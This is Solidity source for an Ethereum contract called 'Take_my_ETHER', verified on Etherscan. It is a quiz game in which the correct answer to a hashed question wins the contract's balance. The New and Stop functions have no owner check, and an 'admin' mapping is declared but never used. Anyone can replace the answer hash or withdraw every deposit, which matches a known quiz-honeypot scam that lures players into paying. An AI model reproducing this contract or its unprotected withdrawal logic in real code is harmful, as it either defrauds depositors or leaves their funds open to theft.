/**
 *Submitted for verification at Etherscan.io on 2024-04-23
*/

contract Take_my_ETHER
{
    function Try(string memory _response) public payable
    {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(abi.encode(_response)) && msg.value > 100 wei)
        {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    string public question;

    bytes32 responseHash;

    mapping (bytes32=>bool) admin;

    function Start(string calldata _question, string calldata _response) public payable {
        if(responseHash==0x0){
            responseHash = keccak256(abi.encode(_response));
            question = _question;
        }
    }

    function Stop() public payable  {
        payable(msg.sender).transfer(address(this).balance);
        responseHash = 0x0;
    }

    function New(string calldata _question, bytes32 _responseHash) public payable  {
        question = _question;
        responseHash = _responseHash;
    }



    fallback() external {}
}